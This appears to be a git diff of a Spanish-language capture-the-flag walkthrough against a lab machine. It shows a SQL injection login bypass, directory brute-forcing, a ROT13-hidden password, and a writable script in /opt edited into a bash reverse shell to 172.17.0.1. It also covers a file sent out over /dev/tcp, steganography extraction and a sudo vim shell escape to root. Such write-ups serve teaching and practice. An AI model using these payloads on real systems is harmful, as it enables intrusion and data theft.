@@ -26,21 +26,20 @@ Por lo que ahora, configuraremos ```/etc/hosts``` para acceder a la página, de 
 
 ## Paso N3: SQL Injection
 Ahora sí, una vez dentro de la página, podremos acceder a una pestaña de login, en la cuál pide un usuario y una contraseña, por lo que intentamos hacer una SQLi de la siguiente manera:
+![sqli](images/img3.png)
 ```
 ' OR 1=1 -- -
 ```
-![]()
-
 ```' OR 1=1 -- -``` funciona de la siguiente manera: ```'``` sirve para cerrar la cadena de texto donde se encuentra el input, ```OR 1=1``` se usa como un condicional, para que devuelva TRUE, haciendo que la condicion se cumpla sin importar los datos reales, ```-- -``` los primero dos guíones sirven para comentar el resto de la línea, el espacio y guíon restante sirve de relleno para asegurar que la inyección se ejecute correctamente, por lo que ahora tenemos acceso a la página.
 
 ## Paso N4: Buscando subdirectorios
 Al acceder a la página, tenemos una lista con las columnas: id, nombre, departamento y fecha de inicio. No tenemos alguna idea de que hacer con eso, por lo que buscamos diferentes directorios para buscar mas información con gobuster
+![dir search](images/img4.png)
 ```
  gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://gatekeeperhr.com/
 ```
-![]()
-
 Y encontramos el subdirectorio /spam, que al hacerle un ```curl``` (o en su defecto entrar e inspeccionar la página) encontraremos un comentario:
+![html comment](images/img5.png)
 ```
 <!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
 ```
@@ -53,14 +52,19 @@ Por intuición, supe que era un cifrado ROT13, por lo que procedo a descifrarlo 
 Una vez ya teniendo la contraseña de uno de los pasantes, volvemos a la pagina inicial luego del login, y buscando por la columna de departamento encontramos dos pasantes, **Pedro Ramirez** y **Valentina Gomez**, por lo que ahora probaremos la contraseña con los dos usuarios que tenemos en el servidor ssh.
 
 Lo intento con el usuario Pedro con ```ssh pedro@172.17.0.2```  y accedemos al usuario correcto.
+![pedro](images/img6.png)
 
 No podemos correr ```sudo -l``` y tampoco hay binarios SUID vulnerables, por lo que podemos empezar a buscar archivos vulnerables.
 En el directorio /opt hay un archivo llamado ```log_cleaner.sh``` de grupo valentina y usuario valentina y tenemos permisos para leerlo, ejecutarlo y editarlo, por lo que lo configuramos para que nos haga una reverse shell.
+![opt](images/img7.png)
+
 En una terminal ejecutamos ```nc -lvnp 443``` y en el usuario de pedro, configuraremos el archivo con ```nano``` de esta manera:
 ```
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 ```
+![rev shell](images/img8.png)
+
 Ahora en la terminal en donde estabamos escuchando, accederemos como valentina.
 
 ## Paso N6: Escalando privilegios
@@ -70,5 +74,8 @@ Para pasarlo, escucharemos en una terminal con ```nc -lvnp 435 > test.jpeg``` y 
 ```
 cat profile_picture.jpeg > /dev/tcp/172.17.0.1/435
 ```
+![jpeg extract](images/img9.png)
+
 Ahora que tenemos el contenido de ```profile_picture.jpeg```, podemos ver si tiene algun mensaje oculto con ```steghide extract -sf test.jpeg``` y nos deja un archivo llamado secret.txt, el cual al abrirlo, vemos que tiene el mensaje 'mag1ck', seguido, ejecutamos ```sudo vim -c ':!/bin/sh'``` en valentina, usando de contraseña ```mag1ck``` y nos convertimos en root.
+
 
